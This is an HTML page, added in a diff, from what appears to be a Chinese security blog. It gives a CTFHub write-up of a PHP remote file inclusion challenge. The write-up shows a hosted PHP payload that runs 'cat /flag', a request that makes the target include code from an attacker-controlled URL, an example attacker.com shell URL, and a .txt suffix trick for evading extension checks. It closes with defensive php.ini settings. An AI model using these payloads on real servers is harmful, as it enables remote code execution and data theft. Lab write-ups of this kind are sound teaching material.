@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/san-blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=san-blog/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>CTFHub RFI 远程文件包含漏洞利用详解 | 东阳的安全笔记</title>
+<meta name="keywords" content="CTF, Web安全, RFI, 远程文件包含, CTFHub, 文件包含">
+<meta name="description" content="题目信息
+
+类型：Web / 文件包含漏洞
+靶场：CTFHub
+核心漏洞：远程文件包含（Remote File Inclusion, RFI）
+目标：通过 RFI 获取服务器 shell 并读取 flag
+
+
+隐私声明：本文中所有敏感 IP 地址均已做屏蔽处理，统一替换为 xxx.xxx.xxx.xxx，避免暴露真实目标资产。
+
+
+漏洞分析
+远程文件包含（RFI）是 PHP 文件包含漏洞的一种高危利用方式。当应用程序使用 include()、require() 等函数加载文件时，如果用户可控的参数未经过严格过滤，攻击者就可以构造恶意 URL，让服务器加载并执行远程服务器上的 PHP 脚本。
+本题的关键利用点：
+
+页面存在 ?file= 参数，用于指定要包含的文件路径
+服务器配置中 allow_url_include 或 allow_url_fopen 开启，允许包含远程 URL
+攻击者可以在自己控制的服务器上托管恶意 PHP 代码，通过 ?file=http://xxx.xxx.xxx.xxx:8000/yjh.txt 触发执行
+
+
+利用步骤
+1. 准备恶意payload
+在攻击者可控的服务器（IP：xxx.xxx.xxx.xxx，端口：8000）上放置文件 yjh.txt，内容如下：
+&lt;?php
+system(&#34;cat /flag&#34;);
+?&gt;
+
+注意：文件名使用了 .txt 后缀，这是为了绕过部分简单的后缀检测。由于 PHP 的 include() 函数在包含远程文件时会执行其中的 PHP 代码，因此即使后缀是 .txt，其中的 PHP 代码依然会被解析执行。
+
+2. 发送包含请求
+通过 Postman 或浏览器构造请求：">
+<meta name="author" content="东阳">
+<link rel="canonical" href="http://localhost:1313/san-blog/posts/ctfhub-rfi-shell/">
+<link crossorigin="anonymous" href="/san-blog/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/san-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/san-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/san-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/san-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/san-blog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/san-blog/posts/ctfhub-rfi-shell/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="http://localhost:1313/san-blog/" accesskey="h" title="东阳的安全笔记 (Alt + H)">东阳的安全笔记</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="http://localhost:1313/san-blog/" title="首页">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/san-blog/posts/" title="文章">
+                    <span>文章</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/san-blog/tags/" title="标签">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/san-blog/categories/" title="分类">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/san-blog/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <nav class="breadcrumbs" role="navigation" aria-label="Breadcrumb">
+            <a href="/san-blog/">Home</a>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+                <polyline points="9 18 15 12 9 6"></polyline>
+            </svg>
+            <a href="/san-blog/posts/">Posts</a>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+        <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+</nav>
+    <h1 class="post-title entry-hint-parent">
+      CTFHub RFI 远程文件包含漏洞利用详解
+    </h1>
+    <div class="post-meta">
+
+<span title='2026-06-06 10:00:00 +0800 CST'>June 6, 2026</span>&nbsp;·&nbsp;<span>1 min</span>&nbsp;·&nbsp;<span>208 words</span>&nbsp;·&nbsp;<span>东阳</span>
+
+</div>
+  </header> 
+  <div class="post-content md-content"><h2 id="题目信息">题目信息<a hidden class="anchor" aria-hidden="true" href="#题目信息">#</a></h2>
+<ul>
+<li><strong>类型</strong>：Web / 文件包含漏洞</li>
+<li><strong>靶场</strong>：CTFHub</li>
+<li><strong>核心漏洞</strong>：远程文件包含（Remote File Inclusion, RFI）</li>
+<li><strong>目标</strong>：通过 RFI 获取服务器 shell 并读取 flag</li>
+</ul>
+<blockquote>
+<p><strong>隐私声明</strong>：本文中所有敏感 IP 地址均已做屏蔽处理，统一替换为 <code>xxx.xxx.xxx.xxx</code>，避免暴露真实目标资产。</p>
+</blockquote>
+<hr>
+<h2 id="漏洞分析">漏洞分析<a hidden class="anchor" aria-hidden="true" href="#漏洞分析">#</a></h2>
+<p>远程文件包含（RFI）是 PHP 文件包含漏洞的一种高危利用方式。当应用程序使用 <code>include()</code>、<code>require()</code> 等函数加载文件时，如果用户可控的参数未经过严格过滤，攻击者就可以构造恶意 URL，让服务器加载并执行远程服务器上的 PHP 脚本。</p>
+<p>本题的关键利用点：</p>
+<ol>
+<li>页面存在 <code>?file=</code> 参数，用于指定要包含的文件路径</li>
+<li>服务器配置中 <code>allow_url_include</code> 或 <code>allow_url_fopen</code> 开启，允许包含远程 URL</li>
+<li>攻击者可以在自己控制的服务器上托管恶意 PHP 代码，通过 <code>?file=http://xxx.xxx.xxx.xxx:8000/yjh.txt</code> 触发执行</li>
+</ol>
+<hr>
+<h2 id="利用步骤">利用步骤<a hidden class="anchor" aria-hidden="true" href="#利用步骤">#</a></h2>
+<h3 id="1-准备恶意payload">1. 准备恶意payload<a hidden class="anchor" aria-hidden="true" href="#1-准备恶意payload">#</a></h3>
+<p>在攻击者可控的服务器（IP：<code>xxx.xxx.xxx.xxx</code>，端口：<code>8000</code>）上放置文件 <code>yjh.txt</code>，内容如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cat /flag&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><blockquote>
+<p>注意：文件名使用了 <code>.txt</code> 后缀，这是为了绕过部分简单的后缀检测。由于 PHP 的 <code>include()</code> 函数在包含远程文件时会执行其中的 PHP 代码，因此即使后缀是 <code>.txt</code>，其中的 PHP 代码依然会被解析执行。</p>
+</blockquote>
+<h3 id="2-发送包含请求">2. 发送包含请求<a hidden class="anchor" aria-hidden="true" href="#2-发送包含请求">#</a></h3>
+<p>通过 Postman 或浏览器构造请求：</p>
+<pre tabindex="0"><code>POST http://challenge-xxx.sandbox.ctfhub.com:10800/?file=http://xxx.xxx.xxx.xxx:8000/yjh.txt
+</code></pre><p>请求体（form-data）：</p>
+<table>
+	<thead>
+			<tr>
+					<th>Key</th>
+					<th>Value</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>haha</td>
+					<td><code>system(&quot;cat /flag&quot;);</code></td>
+			</tr>
+	</tbody>
+</table>
+<p><img alt="RFI利用过程" loading="lazy" src="../../images/ctfhub-rfi-shell/rfi-exploit.png"></p>
+<h3 id="3-获取flag">3. 获取flag<a hidden class="anchor" aria-hidden="true" href="#3-获取flag">#</a></h3>
+<p>服务器成功包含远程文件后，执行了 <code>system(&quot;cat /flag&quot;)</code> 命令，在响应中回显了 flag：</p>
+<pre tabindex="0"><code>ctfhub{795edc0ee1c67318f16e2eb3}
+</code></pre><p>同时页面还回显了提示信息：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">hr</span>&gt;
+</span></span><span style="display:flex;"><span>i don&#39;t have shell, how to get flag?&lt;<span style="color:#f92672">br</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;phpinfo.php&#34;</span>&gt;phpinfo&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span></code></pre></div><p>这说明目标服务器原本是一个无 shell 的受限环境，但利用 RFI 漏洞，我们成功实现了任意代码执行并读取到了 flag。</p>
+<hr>
+<h2 id="原理解析">原理解析<a hidden class="anchor" aria-hidden="true" href="#原理解析">#</a></h2>
+<h3 id="为什么-txt-文件也能执行-php">为什么 .txt 文件也能执行 PHP？<a hidden class="anchor" aria-hidden="true" href="#为什么-txt-文件也能执行-php">#</a></h3>
+<p>当 PHP 使用 <code>include()</code>、<code>require()</code> 等函数包含远程文件时：</p>
+<ol>
+<li>PHP 会发起 HTTP 请求获取远程文件内容</li>
+<li>获取到的内容会被当作 PHP 代码解析执行</li>
+<li>文件扩展名不影响 PHP 解析器的行为，关键是内容中是否包含 <code>&lt;?php ... ?&gt;</code> 标签</li>
+</ol>
+<p>因此，攻击者可以将恶意 PHP 代码保存在任意扩展名的文件中（如 <code>.txt</code>、<code>.jpg</code> 等），只要被 <code>include()</code> 加载，就会执行。</p>
+<h3 id="rfi-vs-lfi">RFI vs LFI<a hidden class="anchor" aria-hidden="true" href="#rfi-vs-lfi">#</a></h3>
+<table>
+	<thead>
+			<tr>
+					<th>特性</th>
+					<th>LFI（本地文件包含）</th>
+					<th>RFI（远程文件包含）</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>包含来源</td>
+					<td>服务器本地文件</td>
+					<td>远程服务器文件</td>
+			</tr>
+			<tr>
+					<td>利用条件</td>
+					<td>需要可控文件路径</td>
+					<td>需要 <code>allow_url_include=On</code></td>
+			</tr>
+			<tr>
+					<td>危害程度</td>
+					<td>可读取本地敏感文件</td>
+					<td>直接获取远程代码执行（RCE）</td>
+			</tr>
+			<tr>
+					<td>典型利用</td>
+					<td>包含 <code>/etc/passwd</code>、日志文件</td>
+					<td>包含 <code>http://attacker.com/shell.txt</code></td>
+			</tr>
+	</tbody>
+</table>
+<p>RFI 的危害通常比 LFI 更大，因为它能直接引入外部恶意代码，无需依赖服务器上已有的文件。</p>
+<hr>
+<h2 id="防御措施">防御措施<a hidden class="anchor" aria-hidden="true" href="#防御措施">#</a></h2>
+<ol>
+<li>
+<p><strong>关闭远程文件包含功能</strong>
+在 <code>php.ini</code> 中设置：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ini" data-lang="ini"><span style="display:flex;"><span><span style="color:#a6e22e">allow_url_fopen</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">Off</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">allow_url_include</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">Off</span>
+</span></span></code></pre></div></li>
+<li>
+<p><strong>严格过滤用户输入</strong>
+对 <code>file</code> 等参数进行白名单校验，只允许包含预定义的安全文件。</p>
+</li>
+<li>
+<p><strong>使用绝对路径</strong>
+避免直接使用用户输入拼接文件路径。</p>
+</li>
+<li>
+<p><strong>文件包含前校验</strong>
+使用 <code>realpath()</code> 和 <code>strpos()</code> 确保被包含文件位于允许访问的目录内。</p>
+</li>
+</ol>
+<hr>
+<h2 id="总结">总结<a hidden class="anchor" aria-hidden="true" href="#总结">#</a></h2>
+<p>本题通过 RFI 漏洞，将无 shell 的受限环境转化为完整的代码执行能力。核心思路是：</p>
+<ol>
+<li>发现 <code>?file=</code> 参数存在文件包含</li>
+<li>验证服务器支持远程 URL 包含</li>
+<li>在可控服务器上托管 PHP 恶意代码</li>
+<li>通过 <code>?file=http://xxx.xxx.xxx.xxx:8000/yjh.txt</code> 触发执行</li>
+<li>成功读取 <code>/flag</code> 获取 flag</li>
+</ol>
+<p>RFI 是 Web 渗透中非常经典的漏洞类型，理解其原理和防御方法对于安全开发和渗透测试都至关重要。</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/san-blog/tags/ctf/">CTF</a></li>
+      <li><a href="http://localhost:1313/san-blog/tags/web%E5%AE%89%E5%85%A8/">Web安全</a></li>
+      <li><a href="http://localhost:1313/san-blog/tags/rfi/">RFI</a></li>
+      <li><a href="http://localhost:1313/san-blog/tags/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">远程文件包含</a></li>
+      <li><a href="http://localhost:1313/san-blog/tags/ctfhub/">CTFHub</a></li>
+      <li><a href="http://localhost:1313/san-blog/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/san-blog/posts/command-injection-filter-bypass/">
+    <span class="title">« Prev</span>
+    <span>命令注入综合过滤绕过实战：从空格到管道的一条龙</span>
+  </a>
+  <a class="next" href="http://localhost:1313/san-blog/posts/php-filter-read-source-code/">
+    <span class="title">Next »</span>
+    <span>php://filter 伪协议：在文件包含中读取源代码</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/san-blog/">东阳的安全笔记</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
